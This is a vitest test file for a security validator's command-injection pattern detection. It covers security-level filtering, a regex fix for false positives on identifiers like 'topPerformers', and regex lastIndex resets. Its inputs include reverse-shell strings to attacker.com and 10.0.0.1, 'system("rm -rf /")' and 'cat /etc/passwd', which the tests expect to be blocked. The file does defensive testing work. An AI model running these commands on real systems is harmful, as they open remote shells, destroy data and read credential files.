import { describe, it, expect } from 'vitest';
import {
  validatePayloadSafetyWithLevel,
  detectPatternCategories
} from '@/security/layers/layer2-validators/pattern-detection.js';
import { ATTACK_PATTERNS } from '@/security/layers/layer-utils/content/patterns/index.js';

describe('Security level sub-category filtering', () => {
  describe('STORAGE level should not run EXECUTION_ONLY sub-categories', () => {
    it('should NOT flag "top" at STORAGE level (command.systemInfo is EXECUTION_ONLY)', () => {
      // "top" matches the /\btop\s*/gi regex in command.systemInfo
      // command.systemInfo is EXECUTION_ONLY, so it should not run at STORAGE
      const result = validatePayloadSafetyWithLevel(
        'the top priority items are listed below',
        'STORAGE'
      );
      expect(result.passed).toBe(true);
    });

    it('should NOT flag "whoami" at STORAGE level (command.systemInfo is EXECUTION_ONLY)', () => {
      const result = validatePayloadSafetyWithLevel(
        'run whoami to check the current user',
        'STORAGE'
      );
      expect(result.passed).toBe(true);
    });

    it('should NOT flag "ps " at STORAGE level (command.systemInfo is EXECUTION_ONLY)', () => {
      const result = validatePayloadSafetyWithLevel(
        'check ps output for running processes',
        'STORAGE'
      );
      expect(result.passed).toBe(true);
    });

    it('should NOT flag "curl" at STORAGE level (command.networkOperations is EXECUTION_ONLY)', () => {
      const result = validatePayloadSafetyWithLevel(
        'use curl to test the endpoint',
        'STORAGE'
      );
      expect(result.passed).toBe(true);
    });

    it('should NOT flag "grep" at STORAGE level (command.fileOperations is EXECUTION_ONLY)', () => {
      // Avoid path-like content that triggers ALWAYS_CHECK path traversal
      const result = validatePayloadSafetyWithLevel(
        'use grep to search for the pattern in output',
        'STORAGE'
      );
      expect(result.passed).toBe(true);
    });
  });

  describe('STORAGE level should still run ALWAYS_CHECK sub-categories', () => {
    it('should flag bash shell access at STORAGE level (command.shellAccess is ALWAYS_CHECK)', () => {
      const result = validatePayloadSafetyWithLevel(
        'bash -i >& /dev/tcp/attacker.com/4444',
        'STORAGE'
      );
      expect(result.passed).toBe(false);
      expect(result.violationType).toBe('COMMAND_INJECTION');
    });

    it('should flag /bin/sh at STORAGE level (command.shellAccess is ALWAYS_CHECK)', () => {
      const result = validatePayloadSafetyWithLevel(
        '/bin/sh -c "malicious"',
        'STORAGE'
      );
      expect(result.passed).toBe(false);
      expect(result.violationType).toBe('COMMAND_INJECTION');
    });

    it('should flag system() at STORAGE level (command.executionWrappers is ALWAYS_CHECK)', () => {
      const result = validatePayloadSafetyWithLevel(
        'system("rm -rf /")',
        'STORAGE'
      );
      expect(result.passed).toBe(false);
      expect(result.violationType).toBe('COMMAND_INJECTION');
    });
  });

  describe('EXECUTION level should run ALL sub-categories', () => {
    it('should flag "top" at EXECUTION level', () => {
      const result = validatePayloadSafetyWithLevel(
        'run top to check processes',
        'EXECUTION'
      );
      expect(result.passed).toBe(false);
      expect(result.reason).toContain('Top Process Monitor');
    });

    it('should flag "whoami" at EXECUTION level', () => {
      const result = validatePayloadSafetyWithLevel(
        'run whoami to check user',
        'EXECUTION'
      );
      expect(result.passed).toBe(false);
      expect(result.reason).toContain('User Identity');
    });
  });

  /**
   * Regression: pre-0.0.15-security the `top` and `whoami` systemInfo
   * patterns used `\b…\s*` which was satisfied by zero whitespace, so any
   * identifier beginning with those letters (`topPerformers`, `topology`,
   * `topic`, `whoamiHandler`, etc.) matched the leading command word.
   * Camel-case API field names are particularly exposed because they
   * reliably begin with a word boundary. Production hit: Codex calling
   * `get_ecosystem_overview({fields:["topPerformers"]})` against
   * `@uluops/registry-mcp` was rejected by the COMMAND_INJECTION layer as
   * "Top Process Monitor" before it could reach the registry's
   * subscription-tier check. The tightened `\b…\b` form continues to fire
   * on every real shell invocation (which always terminates the command
   * word with a non-word character or end-of-string) but rejects
   * identifier substrings cleanly.
   */
  describe('regression: top/whoami must not match identifier substrings (issue surfaced via topPerformers field)', () => {
    const identifierSubstrings = [
      'topPerformers',
      'topology',
      'topic',
      'topical',
      'whoamiHandler',
      'whoamiCheck',
      'whoamiResolver'
    ];

    for (const identifier of identifierSubstrings) {
      it(`should NOT flag "${identifier}" at EXECUTION level`, () => {
        const result = validatePayloadSafetyWithLevel(identifier, 'EXECUTION');
        expect(result.passed, `Expected "${identifier}" to pass — it is an identifier substring, not a shell command`).toBe(true);
      });

      it(`should NOT flag "${identifier}" when nested in a JSON-ish payload at EXECUTION level`, () => {
        // Mirrors the actual production payload shape: a camelCase value
        // inside a JSON-RPC params block reaching layer 2.
        const result = validatePayloadSafetyWithLevel(
          `{"fields":["${identifier}"]}`,
          'EXECUTION'
        );
        expect(result.passed, `Expected "${identifier}" in JSON payload to pass`).toBe(true);
      });
    }

    // True positives must remain hits — symmetric coverage so a future
    // over-correction to the pattern (e.g. requiring a flag) doesn't
    // silently kill detection of the actual command.
    const realShellInvocations = [
      { input: 'top', label: 'bare command' },
      { input: 'top -o cpu', label: 'flagged' },
      { input: 'top | head', label: 'piped' },
      { input: 'top; ls', label: 'shell-separator' },
      { input: 'whoami', label: 'bare command' },
      { input: 'whoami | grep root', label: 'piped' },
      { input: 'whoami; cat /etc/passwd', label: 'shell-separator' }
    ];

    for (const { input, label } of realShellInvocations) {
      it(`should STILL flag "${input}" (${label}) at EXECUTION level`, () => {
        const result = validatePayloadSafetyWithLevel(input, 'EXECUTION');
        expect(result.passed, `Real shell invocation "${input}" must remain blocked`).toBe(false);
      });
    }
  });

  describe('QUERY level should not run EXECUTION_ONLY sub-categories', () => {
    it('should NOT flag "top" at QUERY level', () => {
      const result = validatePayloadSafetyWithLevel(
        'the top results are shown',
        'QUERY'
      );
      expect(result.passed).toBe(true);
    });

    it('should flag shell access at QUERY level (ALWAYS_CHECK)', () => {
      const result = validatePayloadSafetyWithLevel(
        'bash -i >& /dev/tcp/10.0.0.1/4444',
        'QUERY'
      );
      expect(result.passed).toBe(false);
    });
  });
});

describe('Regex lastIndex reset (stateful g-flag bug)', () => {
  it('detectPatternCategories should match consistently across repeated calls', () => {
    // The 'g' flag on RegExp makes .test() stateful — lastIndex advances.
    // Without the reset fix, the second call would start matching from where
    // the first call's match ended, potentially missing the pattern.
    const patterns = ATTACK_PATTERNS.command.systemInfo;
    const content = 'run top to monitor';

    // Call three times — all should match if lastIndex is properly reset
    for (let i = 0; i < 3; i++) {
      const result = detectPatternCategories(
        content,
        'Command injection',
        [patterns],
        'COMMAND_INJECTION'
      );
      expect(result.passed, `Call ${i + 1} should detect "top"`).toBe(false);
      expect(result.reason).toContain('Top Process Monitor');
    }
  });

  it('should not alternate between matching and not-matching on repeated calls', () => {
    // This is the specific bug: with 'g' flag and no lastIndex reset,
    // .test() returns true on call 1, false on call 2, true on call 3, etc.
    const patterns = ATTACK_PATTERNS.command.shellAccess;
    const content = '/bin/sh -c "test"';

    const results = [];
    for (let i = 0; i < 5; i++) {
      const result = detectPatternCategories(
        content,
        'Command injection',
        [patterns],
        'COMMAND_INJECTION'
      );
      results.push(result.passed);
    }

    // All calls should return the same result (false = detected)
    expect(results.every(r => r === results[0]),
      `Results should be consistent but got: ${results.join(', ')}`
    ).toBe(true);
    expect(results[0]).toBe(false);
  });

  it('should match the same pattern on different content strings', () => {
    const patterns = ATTACK_PATTERNS.command.systemInfo;

    // Two different strings that both contain "top"
    const result1 = detectPatternCategories(
      'run top now',
      'Command injection',
      [patterns],
      'COMMAND_INJECTION'
    );
    const result2 = detectPatternCategories(
      'check top status',
      'Command injection',
      [patterns],
      'COMMAND_INJECTION'
    );

    expect(result1.passed).toBe(false);
    expect(result2.passed).toBe(false);
  });
});
